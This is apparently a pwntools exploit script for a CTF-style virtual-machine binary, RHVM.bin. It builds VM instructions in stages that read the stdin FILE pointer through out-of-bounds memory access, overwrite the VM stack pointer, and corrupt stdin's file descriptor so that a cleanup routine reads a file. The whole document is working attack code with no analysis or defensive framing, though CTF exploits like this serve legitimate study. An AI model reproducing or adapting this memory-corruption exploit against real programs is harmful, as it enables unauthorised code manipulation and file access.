from pwn import *

# context.log_level = 'debug'

def init(eip=0, esp=0):
    io.readuntil("EIP:")
    io.sendline("%d" % eip)
    io.readuntil("ESP:")
    io.sendline("%d" % esp)

def execute(instructions):
    io.readuntil("length:")
    io.sendline("%d" % (len(instructions)))
    io.readuntil("code:")
    for instruction in instructions:
        io.sendline(str(instruction))
    io.interactive()

def generate(opcode, reg0=0, reg1=0):
    '''
    OPCODE 0  0 0 SRC DST
    '''
    instruction = "%s%s%s\x00\x00\x00\x00\x00" % (chr(reg1), chr(reg0), chr(opcode))
    return instruction

def rr_xor(reg0, reg1):
    return generate(0x10, reg0=reg0, reg1=reg1)

def rr_or(reg0, reg1):
    return generate(0x20, reg0=reg0, reg1=reg1)

def ri_mov(reg, instant):
    return generate(0x40, reg0=reg, reg1=instant)

def mr_mov(memory, reg):
    return generate(0x41, reg0=memory, reg1=reg)

def rm_mov(reg, memory):
    return generate(0x42, reg0=reg, reg1=memory)

def offset_jmp_backward(offset):
    return generate(0x50, reg1=offset)

def debug():
    return generate(0x60)

def r_push(reg):
    return generate(0x70, reg1=reg)

def r_pop(reg):
    return generate(0x80, reg1=reg)

def rr_add(reg0, reg1):
    return generate(0xA0, reg0=reg0, reg1=reg1)

def rr_div(reg0, reg1):
    return generate(0xB0, reg0=reg0, reg1=reg1)

def rr_mul(reg0, reg1):
    return generate(0xC0, reg0=reg0, reg1=reg1)

def rr_sub(reg0, reg1):
    return generate(0xD0, reg0=reg0, reg1=reg1)

def rr_shl(reg0, reg1):
    return generate(0xE0, reg0=reg0, reg1=reg1)

def rr_shr(reg0, reg1):
    return generate(0xF0, reg0=reg0, reg1=reg1)

def set_reg(reg, value):
    instructions = []
    data = struct.pack("<I", value)
    data = bin(value)[2:]
    print(repr(data))
    for i in data:
        print(repr(i))
        instructions.append(ri_mov(reg, ord(i)))
        instructions.append(rr_shl(reg, 8))
        instructions.append(debug())
    return instructions[0:-1]

class AssemblyBuilder:
    def __init__(self):
        self.instructions = []

    def append(self, instruction, debug_flag=False):
        assert len(self.instructions) < 40
        self.instructions.append(u64(instruction))
        if debug_flag:
            self.instructions.append(u64(debug()))

    def display(self):
        print("\n".join(str(i) for i in self.instructions))

filename = "./RHVM.bin"

io = process(filename)
elf = ELF(filename)

init()


builder = AssemblyBuilder()

###############################################################
# Stage1. read lower 4 bytes of stdin pointer in .bss section
###############################################################

# mov reg1, 8
# mov reg2, 4
builder.append(ri_mov(1, 8))
builder.append(ri_mov(2, 4))
# sub reg0, reg1
# sub reg0, reg1
# sub reg0, reg2
builder.append(rr_sub(0, 1))
builder.append(rr_sub(0, 1))
builder.append(rr_sub(0, 2))
# mov [register+reg7*4], [memory+reg0*4]
builder.append(rm_mov(7, 0))

###############################################################
# Stage2. set reg0 to (FILE *) stdin->fno
###############################################################
# reg0 += 0b1110000

# shl reg3, reg2
builder.append(ri_mov(3, 7))
builder.append(rr_shl(3, 2))
# add reg0, reg3
builder.append(rr_add(0, 3))
# sub reg0, reg2
builder.append(rr_sub(0, 2))

###############################################################
# Stage3. overwrite stack pointer
###############################################################
builder.append(ri_mov(7, 6))

# lower 4 bytes

# mov reg4, 2
builder.append(ri_mov(4, 2))
# sub reg5, reg1
builder.append(rr_sub(5, 1))
# sub reg5, reg4
builder.append(rr_sub(5, 4))
# mov [memory+reg5*4], [register+reg0*4]
builder.append(mr_mov(5, 0), debug_flag=True)

# higher 2 bytes
builder.append(rr_xor(0, 0))
builder.append(rr_sub(0, 1))
builder.append(rr_sub(0, 1))
builder.append(rr_sub(0, 2))
builder.append(ri_mov(3, 1))
builder.append(rr_add(0, 3))
builder.append(rm_mov(7, 0), debug_flag=True)

builder.append(ri_mov(4, 1))
builder.append(rr_add(5, 4), debug_flag=True)
builder.append(mr_mov(5, 6), debug_flag=True)

###############################################################
# Stage4. push 0x233 into stack to overwrite fno = 0x233
###############################################################
# set reg0 to 0x233
# 0x233 = 0b001 000 110 011
builder.append(ri_mov(0, 0b001))
builder.append(ri_mov(1, 6))
builder.append(rr_shl(0, 1))
builder.append(ri_mov(2, 0b110))
builder.append(rr_add(0, 2))
builder.append(ri_mov(1, 3))
builder.append(rr_shl(0, 1))
builder.append(rr_add(0, 1))

# push
builder.append(r_push(0))

###############################################################
# Stage5. trigger cleanup function to read file
###############################################################

builder.display()
execute(builder.instructions)
